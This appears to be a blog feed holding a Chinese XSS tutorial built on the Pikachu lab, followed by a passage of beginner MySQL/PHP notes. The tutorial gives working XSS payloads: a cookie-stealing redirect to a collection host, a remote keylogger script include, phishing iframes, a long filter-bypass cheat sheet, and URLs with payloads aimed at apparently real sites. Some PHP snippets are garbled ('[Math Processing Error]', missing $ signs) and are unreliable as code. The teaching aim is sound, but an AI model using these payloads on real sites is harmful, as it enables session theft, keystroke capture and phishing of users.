        <content type="html"><![CDATA[<h2 id="xss总结图"><a href="#xss总结图" class="headerlink" title="xss总结图"></a>xss总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB.png"></p><h2 id="xss攻击图"><a href="#xss攻击图" class="headerlink" title="xss攻击图"></a>xss攻击图</h2><p><img src="/image/xss/xss%E6%94%BB%E5%87%BB%E5%9B%BE.jpg"></p><h2 id="一、什么是-XSS"><a href="#一、什么是-XSS" class="headerlink" title="一、什么是 XSS"></a>一、什么是 XSS</h2><p>XSS全称（Cross Site Scripting）跨站脚本攻击，是最常见的Web应用程序安全漏洞之一。XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。</p><h2 id="二、XSS漏洞出现的原因"><a href="#二、XSS漏洞出现的原因" class="headerlink" title="二、XSS漏洞出现的原因"></a>二、XSS漏洞出现的原因</h2><p>程序对输入和输出的控制不够严格,导致”精心构造“的脚本输入后,在输到前端时被浏览器当作有效代码解析执行从而产生危害.</p><h2 id="三、XSS的危害"><a href="#三、XSS的危害" class="headerlink" title="三、XSS的危害"></a>三、XSS的危害</h2><p>1、首先对于那些半年没有更新的小企业网站来说，发生XSS漏洞几乎没有什么用。一般在各类的社交平台，邮件系统，开源流行的Web应用，BBS，微博等场景中，造成的杀伤力却十分强大。<br>2、劫持用户cookie是最常见的跨站攻击形式，通过在网页中写入并执行脚本执行文件（多数情况下是JavaScript脚本代码），劫持用户浏览器，将用户当前使用的sessionID信息发送至攻击者控制的网站或服务器中。<br>3、“框架钓鱼”。利用JS脚本的基本功能之一：操作网页中的DOM树结构和内容，在网页中通过JS脚本，生成虚假的页面，欺骗用户执行操作，而用户所有的输入内容都会被发送到攻击者的服务器上。<br>4、挂马（水坑攻击）<br>5、有局限性的键盘记录</p><h2 id="四、-XSS分类"><a href="#四、-XSS分类" class="headerlink" title="四、 XSS分类"></a>四、 XSS分类</h2><p>1、反射型XSS或不持久型XSS(中危)<br>交互的数据一般不会被存在在数据库里面,只是简单的把用户输入的数据反射给浏览器，一次性，所见即所得。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line"></span><br><span class="line">&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;&#x2F;sCrIpT&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">_GET[&#39;name&#39;];</span><br><span class="line"></span><br><span class="line">echo &quot;Welcome $name</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>2、储存型XSS 或持久型 XSS（高危）<br>交互的数据会被存在在数据库里面,永久性存储,具有很强的稳定性</p><p>3、DOM XSS<br>不与后台服务器产生数据交互,通过前端的dom节点形成的XSS漏洞。<br>什么是DOM:DOM全称是Document Object Model，也就是文档对象模型。我们可以将DOM理解为，一个与系统平台和编程语言无关的接口，程序和脚本可以通过这个接口动态地访问和修改文档内容、结构和样式。当创建好一个页面并加载到浏览器时，DOM就悄然而生，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。故可以使用 Javascript 语言来操作DOM以达到网页的目的。<br><a href="https://links.jianshu.com/go?to=https://www.w3school.com.cn/htmldom/index.asp">https://www.w3school.com.cn/htmldom/index.asp</a><br><code>&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;</code><br><code>&lt;a href=&#39;#&#39; onclick=&quot;alert(1111)&quot;&gt;what do you see?&lt;/a&gt;</code><br><code>&lt;a href=&#39;#&#39; onclick=&quot;alert(2222)&quot;&gt;what do you see?&lt;/a&gt;</code></p><h2 id="五、XSS可能存在的地方"><a href="#五、XSS可能存在的地方" class="headerlink" title="五、XSS可能存在的地方"></a>五、XSS可能存在的地方</h2><p>HTML context<br>Attribute Context<br>URL Context<br>Style Context<br>Script Context</p><h2 id="六、XSS测试方法"><a href="#六、XSS测试方法" class="headerlink" title="六、XSS测试方法"></a>六、XSS测试方法</h2><p>1、工具扫描：APPscan、AWVS<br>2、手工测试：Burpsuite、firefox(hackbar)、XSSER XSSF<br>使用手工检测Web应用程序是否存在XSS漏洞时，最重要的是考虑那里有输入，输入的数据在什么地方输出。在进行手工检测XSS时，人毕竟不像软件那样不知疲惫，所以一定要选择有特殊意义的字符，这样可以快速测试是否存在XSS。<br>（1）在目标站点上找到输入点,比如查询接口,留言板等;<br>（2）输入一组”特殊字符+唯一识别字符”,点击提交后,查看返回的源码,是否有做对应的处理;<br>（3）通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞;</p><h2 id="七、实战"><a href="#七、实战" class="headerlink" title="七、实战"></a>七、实战</h2><p>1、xss平台搭建及后台使用（cookie获取）<br><code>&#39;&quot;&gt;&lt;script&gt;document.location = &#39;http://192.168.0.113/pikachu/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie;&lt;/script&gt;</code></p><p>//通过document.location 实例进行重定向到<a href="https://links.jianshu.com/go?to=http://127.0.0.1/pikachu/index.php">http://127.0.0.1/pikachu/index.php</a><br>php版本影响实验结果</p><p>2、反射型XSS(POST)获取用户密码<br>post攻击利用页面   D:\phpStudy\WWW\pikachu\pkxss\xcookie\post.html<br><a href="https://links.jianshu.com/go?to=http://192.168.0.113:80/post.html">http://192.168.0.113:80/post.html</a></p><p>3、xss钓鱼演示<br>钓鱼攻击利用页面   E:\phpStudy\WWW\pikachu\pkxss\xfish</p><p>4、xss获取键盘记录演示</p><p>(1)、什么是跨域</p><p>​    http:// www.   oldboyedu.com  :80 /   news/index.php</p><p>协议  子域名        主域名         端口资源地址</p><p>​    当协议、主机(主域名，子域名)、端口中的任意一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，成为跨域操作。</p><p>(2)、同源策略</p><p>​    为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本既不同域之间不能使用JS进行操作。比如：x.com域名下的js不能操作y.com域名下的对象</p><p>​    那么为什么要有同源策略？ 比如一个恶意网站的页面通过js嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码。</p><p>Tips:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的</p><p><code>&lt;script src=&quot;...&quot;&gt;</code>  //加载本地js执行</p><p><code>&lt;img src=&quot;C:/blog/source/_posts/...&quot;&gt;  </code>//图片</p><p><code>&lt;link href=&quot;...&quot;&gt;</code>  //css</p><p><code>&lt;iframe src=&quot;...&quot;&gt;</code>  //任意资源</p><p>(3)、同源策略修改</p><p>​    E:\phpStudy\WWW\pikachu\pkxss\rkeypress\rkserver.php</p><p>​    同之前的案例到后台设置好Access-Control-Allow-Origin，设置为*，既允许所有人访问。</p><p>(4）rk.js关键代码解读</p><p>​    var realkey = String.fromCharCode(event.keyCode);  //获取用户键盘记录，最后转化为字符串</p><p>​    xl+=realkey;   //赋值给x1</p><p>​    show();    //调用show函数，通过下面ajax进行post发送键盘记录人内容</p><p>输入设置好的恶意JS代码：</p><p><code>&lt;script src=&quot;http://192.168.3.60/pikachu/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</code></p><p>然后在键盘上随意输入，就可以到xss平台上去查看键盘输入的结果</p><h2 id="八、xss如何绕过及安全防范"><a href="#八、xss如何绕过及安全防范" class="headerlink" title="八、xss如何绕过及安全防范"></a>八、xss如何绕过及安全防范</h2><p>多数网站为了避免xss的攻击，对于攻击者的输入都采取了过滤的措施，导致攻击者通常不能正常插入恶意代码来达到攻击目的。但是仍存在一些漏洞可以利用，来绕过过滤措施。</p><p>​    xss绕过的方法有许多，主要取决于攻击者的思路和对前端技术的掌握，以下介绍几个简单的绕过方法。</p><p>（1）对前端的限制可以尝试进行抓包重发或者修改前端的HTML。</p><p>（2）防止后台对输入的内容进行正则匹配来过滤输入，对于这样的过滤可以考虑大小写混合输入的方法。</p><p> 例：<code>&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;</code></p><p>（3）防止后台对输入的内容进行替换，采用拼拼凑的输入方法。</p><p> 例：<code>&lt;sc&lt;script&gt;ript&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/scr&lt;script&gt;ipt&gt;</code></p><p>（4）使用注释来干扰后台对输入内容的识别。</p><p> 例：<code>&lt;sc&lt;!--test--&gt;ript&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/scr&lt;!--tshauie--&gt;ipt&gt;</code></p><p>（5）编码</p><p> 思路：后台有可能会对代码中的关键字进行过滤，但我们可以尝试将关键字进行编码后在插入，浏览器对改编码进行识别时，会翻译成正常的代码。（注意：编码在输出时是否会被正常识别和翻译才是关键，不是所有的编码都是可以的）</p><p>  例：使用事件属性onerror():</p><p><code>&lt;img src=# onerror=&quot;alert(&#39;oldboy&#39;)&quot;/&gt;</code></p><p>​    使用HTML进行编码：</p><p>` &lt;img src=x</p><p>onerror=”&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#121;&#97;&#110;&#103;&#115;&#104;&#117;&#97;&#110;&#103;&#39;&#41;”/&gt;`</p><p> （6）样式绕过</p><p>`&lt;div style=”color: ‘&lt;’; color:</p><p>expression(alert(‘XSS’))”&gt;`</p><p>(7)XSS绕过之htmlspecialchars()函数</p><p>htmlspecialchars()函数把一些预定义的字符转换为 HTML 实体。yangshiy</p><p>预定义的字符是：</p><p> &amp; (和号)成为 &amp;amp</p><p> “ (双引号)成为 &amp;quot</p><p> ’ (单引号)成为&amp;#039</p><p> &lt;(小于)成为 &amp;lt</p><p><code>&gt;</code>(大于)成为 &amp;gt</p><p>该函数的语法：htmlspecialchars(string,flags,character-set,double_encode)</p><p>过滤原理：htmlspecialchars() 函数把预定义的字符转换为 HTML 实体，从而使XSS攻击失效。但是这个函数默认配置不会将单引号和双引号过滤，只有设置了quotestyle规定如何编码单引号和双引号才能会过滤掉单引号</p><p>可用的quotestyle类型：</p><p>ENT_COMPAT - 默认。仅编码双引号</p><p>ENT_QUOTES - 编码双引号和单引号</p><p>ENT_NOQUOTES - 不编码任何引号</p><p>可使用以下语句绕过：  q’ onclick=’alert(111)’</p><p> (8) xss之href输出绕过：javascript:alert(1111)直接代入a标签herf里面一样可以绕过htmlspecialchars</p><p> (9) xss之js输出绕过：<code>1&#39;&lt;/script&gt;&lt;script&gt;alert(1111)&lt;/script&gt;</code></p><p> 思路：后台有可能会对代码中的关键字进行过滤，但我们可以尝试将关键字进行编码后在插入，浏览器对改编码进行识别时，会翻译成正常的代码。（注意：编码在输出时是否会被正常识别和翻译才是关键，不是所有的编码都是可以的）</p><p>phpstudy配置伪静态</p><p><a href="https://links.jianshu.com/go?to=https://jingyan.baidu.com/article/e9fb46e151a6557521f766d6.html">https://jingyan.baidu.com/article/e9fb46e151a6557521f766d6.html</a></p><p>伪静态注入的总结</p><p><a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/jsq16/p/5942003.html">https://www.cnblogs.com/jsq16/p/5942003.html</a></p><h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>XSS盲打就是攻击者在前端提交的数据不知道后台是否存在xss漏洞的情况下，提交恶意JS代码在类似留言板等输入框后，所展现的后台位置的情况下，网站采用了攻击者插入的恶意代码，当后台管理员在操作时就会触发插入的恶意代码，从而达到攻击者的目的。例如输入：</p><p><code>&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;</code></p><hr><p>管理员后台：  <a href="http://http//192.168.0.113/pikachu/vul/xss/xssblind/admin_login.php">http://http://192.168.0.113/pikachu/vul/xss/xssblind/admin_login.php</a> </p><h2 id="跨站语句"><a href="#跨站语句" class="headerlink" title="跨站语句"></a>跨站语句</h2><p><code>&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt; </code>  大小写绕过<br><code>&#39;&quot;&gt;&lt;IFRAME SRC=javascript:alert(&#39;XSXSSSs&#39;)&gt;&lt;/IFRAME&gt;</code><br><code>&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XXSSSS&quot;)&lt;/scr&lt;/script&gt;ipt&gt;</code>  过滤script绕过<br><code>&lt;img src=&quot;&quot;onerror=&quot;alert(&#39;xss&#39;)&quot;&gt; </code>  直接k掉script绕过<br><code>&lt;script&gt;eval(string.fromcharcode(97,108,101,114,116,40,39,120,115,115,39,41))&lt;/script&gt;  </code>包含alert就绕过（括号一串数字是alert(xss)的ASCII值）<br><code>&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>  构造js绕过<br>‘;alert(‘xss’);’   htmlentities没有过滤单引号，直接用单引号绕过。<br><code>..../example8.php/[/url]&#39;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; &quot;&lt;</code>   当post 地址使用了当前url的时候，可这样绕过<br><code>..../example9.php#&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; </code> 通过构造一个带xss的锚点绕过<br><code>&lt;script&gt;1&lt;(br=1)*/%0dalert(1)&lt;/script&gt;=&lt;script&gt;1&lt;(br=1)*/&lt;br/&gt;</code>alert(1)</script>   过chrome默认xss过滤器<br><a href="http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF%3C/script%3E%3Cscript%3E1%3C(br=1)*/%0Deval(atob(location.hash.substr(1)))%3C/script%3E#xxxxxx">http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF%3C/script%3E%3Cscript%3E1%3C(br=1)*/%0deval(atob(location.hash.substr(1)))%3C/script%3E#xxxxxx</a></p><p>%22Onclick%3D(outerHTML%3DURL)|%26quot#&lt;img/src=# onerror=alert()&gt;<br>%27%29%0D%0Aalert%28document.cookie%29%2F%2F</p><p><code>&lt;script&gt;alert(&quot;跨站&quot;)&lt;/script&gt;</code>    (最常用）<br><code>&lt;img scr=javascript:alert(&quot;跨站&quot;)&gt;&lt;/img&gt;</code></p><p><a href="http://www.example.com/MyApp.aspx?myvar=">http://www.example.com/MyApp.aspx?myvar=</a> “&gt;&lt;/XSS/*-*/STYLE=xss:e/**/xpression(alert(‘XSS’))&gt;</p><p><code>&lt;IFRAME SRC=javascript:alert(&#39;test&#39;)&gt;&lt;/IFRAME&gt;</code><br>“ onclick=”alert(1)”<br><code>&lt;img scr=&quot;javascrip&amp;#116&amp;#58 alert(/跨站/)&gt;&lt;/img&gt;</code><br><code>&lt;img scr=&quot;javas????cript:alert(/跨站/)&quot; width=150&gt;&lt;/img&gt;</code> (?用tab键弄出来的空格）<br><code>&lt;img scr=&quot;#&quot; onerror=alert(/跨站/)&gt;&lt;/img&gt;</code><br><code>&lt;img scr=&quot;#&quot; style=&quot;xss:expression(alert(/xss/));&quot;&gt;&lt;/img&gt;</code><br><code>&lt;img scr=&quot;#&quot;/* */onerror=alert(/xss/) width=150&gt;&lt;/img&gt;</code> (/**/ 表示注释）<br><code>&lt;img src=vbscript:msgbox (&quot;xss&quot;)&gt;&lt;/img&gt;</code><br><code>&lt;style&gt; input &#123;left:expression (alert(&#39;xss&#39;))&#125;&lt;/style&gt;</code><br><code>&lt;div style=&#123;left:expression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;</code><br><code>&lt;div style=&#123;left:exp/* */ression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;</code><br><code>&lt;div style=&#123;left:\0065\0078ression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;</code><br>html 实体 <code>&lt;div style=&#123;left:&amp;#ｘ0065；xpression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;</code><br>unicode <code>&lt;div style=&quot;&#123;left:expRessioN (alert(&#39;xss&#39;))&#125;&quot;&gt;</code></p><p><code>&quot;]&#125;%3Cscript%3Ealert(&#39;By b14ckb0y&#39;)%3C/script%3E&#123;[&amp;item=&quot;]&lt;iframe%20src=http://new.qzone.qq.com/9530772%20width=400%20height=600&gt;&lt;/iframe&gt;[&quot;</code></p><p>/peixun/Search.asp?Field=&amp;Keyword=&amp;ClassID=0&amp;page=2<br><code>/peixun/Search.asp?Field=&#39;/&gt;&lt;script&gt;alert(451)&lt;/script&gt;&amp;Keyword=&amp;ClassID=0&amp;page=2</code></p><p>Referer: <code>&#39;&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(312)&lt;/script&gt; </code> 传送头插入</p><p>/peixun/Search.asp?Field=%27%22%3E%3Ciframe+id%3D445+src%3Dhttp%3A%2F%2Fdemo.testfire.net%2Fphishing.html%3E</p><p><code>/peixun/Search.asp?Field=&#39;&quot;&gt;&lt;iframe id=445 src=http://demo.testfire.net/phishing.html&gt;</code></p><p><code>&lt;script src=&quot;http://192.168.1.55:8080/xssing-master/?u=f389c3&quot; &gt; &lt;/script&gt; </code><br><code>&lt;script&gt;document.location=(&#39;http://www.baidu.com&#39;)&lt;/script&gt; </code><br><code>&lt;script&gt;document.write(&#39;&lt;iframe src=http://www.baidu.com  width=0 height=0&gt;&lt;/iframe&gt;&#39;);&lt;/script&gt; </code></p><p>/user/User_Message.asp?Action=Manage&amp;ManageType=Inbox&amp;Field=Content%22%3e%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%38%34%38%33%29%3c%2f%73%43%72%49%70%54%3e </p><p><code>&lt;input id=&quot;Submit&quot; type=&quot;submit&quot; value=&quot;保存修改结果&quot; onclick=&quot;alert(1)&quot;/&gt; &lt; name=&quot;Submit&quot;&gt;</code></p><p><a href="http://www.xx.com/netsearch_pre.jsp?netname=1&quot;">http://www.xx.com/netsearch_pre.jsp?netname=1&quot;</a> onmouseenter=”prompt(/csits/)</p><p>url=%0aX-XSS-Protection:%200%0a%0d%0a%0d&lt;img%20src=1%20onerror=alert(/xss/)&gt;</p><p><a href="http://edu.gf.com.cn/simulate?type=simulate_open&amp;category=%3Cimg%20src=@%20onmouseover=confirm(/xssme27/)%3E">http://edu.gf.com.cn/simulate?type=simulate_open&amp;category=%3Cimg%20src=@%20onmouseover=confirm(/xssme27/)%3E</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP及mysql数据库</title>
      <link href="2020/09/12/PHP%E5%8F%8Amysql%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>2020/09/12/PHP%E5%8F%8Amysql%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><p>1.数据库的五个基本单位：数据库服务器，数据库，数据表，字段（数据列），数据行</p><p>2.数据库登录命令：mysql -h localhost -u root -p       (-h 连接名，本地连接可以不写，-u 用户名， -p 用密码的方式登录)</p><p>3.数据库引擎：MyISAM与nnoDB<br>区别：<br>            MyISAM：能更好的的用于查找，不支持事务。<br>            nnoDB：更好的用于增删改，支持事务。<br>            详细 ：<a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/vicenteforever/articles/1613119.html">https://www.cnblogs.com/vicenteforever/articles/1613119.html</a>       </p><p>4.常用的数据库编码<br>             gbk–chinese–ci 简体中文，不区分大小。<br>             uft8–general不区分大小写。</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="二、数据库定义语句（DDL）"><a href="#二、数据库定义语句（DDL）" class="headerlink" title="二、数据库定义语句（DDL）"></a>二、数据库定义语句（DDL）</h3><ol><li><p>创建数据库 create  database  </p><p>数据库名称;<br>create database books;           </p></li><li><p>查看数据库 show data</p></li><li><p>删除数据库</p></li></ol><p>​       drop database user;</p><ol start="4"><li><p>创建数据表 </p><p>use user;            //使用数据库<br>create table book (<br>id int(20) primary key,<br>bookname varchar(255),<br>type varchar(255),<br>information varchar(255)<br>)<br>注：最后没有“,”,primary key 为主键</p></li><li><p>查看本数据库所有数据表</p><p>show tables;</p></li><li><p>查看表结构</p><p>desc user;</p></li><li><p>修改数据表</p><p>向数据表中添加新字段：alter table book add column ISDN int(20);</p><p>向数据表中删除字段：alter table book drop column ISDN;</p><p>修改数据表中字段的类型：alter table book modify column type int(200);</p><p>修改数据表中字段的名称及类型：alter table book change column type phone int(25);</p></li><li><p>删除数据表</p><p>drop table book;</p></li><li><p>查看数据库创建过程</p><p>show create database books;</p></li><li><p>查看表创建源码：</p><p>show create table user；</p></li></ol><h3 id="三、数据库定义语言（DML）"><a href="#三、数据库定义语言（DML）" class="headerlink" title="三、数据库定义语言（DML）"></a>三、数据库定义语言（DML）</h3><p>1.向数据表中插入数据<br>insert into user (id,username,password,birthday) values(5,”qiqi”,123456,”1998.05.26”);</p><p>2.修改表中的数据<br>update user set username=”zhao” where id=5;</p><p>3.删除表中的数据<br>删除所有数据：delete from user；</p><h3 id="四、权限操作"><a href="#四、权限操作" class="headerlink" title="四、权限操作"></a>四、权限操作</h3><ol><li><p>授予权限 </p><p>grant 权限 on 库.表 to’用户‘@’主机’ identified by ‘密码’;<br>示例         grant select, inserton test.* to ‘liwenkai’@’localhost’ identified by ‘4311’;<br>示例说明        给予liwenkai用户，在本机连接test库所有表的权限。操作的这些表具有查询和写入权限。</p></li><li><p>删除权限</p><p>基本语法：revoke 权限 on 库.表  from ‘用户‘@’主机’;<br>示例：revoke select ,insert on test.* from ‘liwenkai’@’localhost’;</p></li></ol><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="一、基本语法"><a href="#一、基本语法" class="headerlink" title="一、基本语法"></a>一、基本语法</h3><p>1.定义 （$+有意义的名称）<br>$shu<br>初始化 $shu=10;//开始定义的时候赋值</p><p>2.可变变量$$+有意义名称；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?p</span><br><span class="line">&#x2F;&#x2F;可变变量</span><br><span class="line"></span><br><span class="line">$shu&#x3D;&#39;biao&#39;;</span><br><span class="line"></span><br><span class="line">$biao&#x3D;&quot;鼠标&quot;;</span><br><span class="line"></span><br><span class="line">echo $$shu;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3.注释<br>单行注释：//<br>单行注释：#<br>多行注释：/* */</p><p>4.数据类型<br>整型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;整数类型 10进制，8进制，16进制int</span><br><span class="line"></span><br><span class="line">$int&#x3D;1000;</span><br><span class="line"></span><br><span class="line">echo $int;</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">$int8&#x3D;01534;</span><br><span class="line"></span><br><span class="line">echo $int8;</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">$int16&#x3D;0x1927fa;</span><br><span class="line"></span><br><span class="line">echo $int16;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>bool类型：<br>只有两个返回值：true ,false</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;布尔类型bool</span><br><span class="line"></span><br><span class="line">$bool&#x3D;true;</span><br><span class="line"></span><br><span class="line">echo $bool;</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump($bool);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>str字符串类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;字符串类型str</span><br><span class="line"></span><br><span class="line">str1&#x3D;&#39;name,let\&#39;s go&#39;;&#x2F;&#x2F;单引号中有符号，会被原样输出</span><br><span class="line"></span><br><span class="line">var_dump($str1);</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">str2&#x3D;&quot;name,let&#39;s go&quot;;&#x2F;&#x2F;双引号中的符号，不会被原样输出，是变量的开始</span><br><span class="line"></span><br><span class="line">var_dump($str2);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5.算数运算符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php&#x2F;&#x2F;算数运算符[Math Processing Error]x&#x3D;5;y&#x3D;10;</span><br><span class="line"></span><br><span class="line">echo [Math Processing Error]x+y;echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">echo [Math Processing Error]x+&#x3D;y;&#x2F;&#x2F;x&#x3D;15</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line"> echo [Math Processing Error]x++;&#x2F;&#x2F;x++是先输出再相加</span><br><span class="line"></span><br><span class="line"> echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">echo ++[Math Processing Error]x; &#x2F;&#x2F;++x是先相加在输出</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">echo [Math Processing Error]y % x;?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二、流程控制"><a href="#二、流程控制" class="headerlink" title="二、流程控制"></a>二、流程控制</h3><p>1.if  else 选择结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php&#x2F;&#x2F;if语句</span><br><span class="line"></span><br><span class="line">$po&#x3D;true;</span><br><span class="line"></span><br><span class="line">if($po)&#123;</span><br><span class="line"></span><br><span class="line"> echo &#39;我愿意去学习！&#39;;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">else&#123;</span><br><span class="line"></span><br><span class="line"> echo &#39;我不愿意去学习！&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.switch case 语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 